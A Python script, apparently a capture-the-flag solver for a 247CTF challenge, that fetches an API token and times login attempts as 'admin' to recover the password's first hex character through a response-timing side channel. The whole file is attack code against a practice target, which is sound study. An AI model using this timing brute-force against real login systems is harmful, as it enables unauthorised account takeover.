#!/usr/bin/env python3
import requests
import time

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    print(f"[+] Token: {token}")
    return token

def try_password(username, password, api_token):
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=10
    )
    elapsed = time.time() - start
    return resp.json(), elapsed

# Probar primera posición
api_token = get_token()
print("\n[*] Probando primera posición:")

timings = {}
for char in HEX_CHARS:
    test_password = char + "0" * 31
    result, elapsed = try_password("admin", test_password, api_token)
    timings[char] = elapsed
    print(f"  {char}: {elapsed:.4f}s - {result}")

print("\n[*] Ordenado por tiempo:")
for char, t in sorted(timings.items(), key=lambda x: x[1], reverse=True):
    print(f"  {char}: {t:.4f}s")
